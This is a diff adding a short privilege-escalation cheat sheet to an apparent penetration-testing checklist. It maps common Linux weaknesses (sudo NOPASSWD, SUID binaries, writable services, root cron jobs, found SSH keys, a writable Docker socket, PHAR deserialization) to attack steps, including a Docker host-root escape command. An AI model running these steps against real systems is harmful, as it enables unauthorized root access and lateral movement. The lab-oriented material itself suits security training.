@@ -1,3 +1,12 @@
+Short "what to try" mapping (common vectors → commands)
+Sudo NOPASSWD → sudo -l then sudo <allowed-command>; check GTFOBins for technique.
+SUID binary → google GTFOBins <binary>; test safe commands locally.
+Writable service binary → replace with benign script (lab): sudo systemctl stop <srv> → replace exec → sudo systemctl start <srv>.
+Cron runs script from /var/www → upload web file that cron will execute as root.
+SSH private key found → ssh -i id_rsa user@other-host.
+Docker socket writable → run docker run -v /:/host --rm -it alpine chroot /host sh.
+PHAR / upload deserialization → upload crafted .phar and trigger file_exists("phar://...") or include.
+
 Quick 10-minute checklist RUN FIRST
 
 # identity & environment
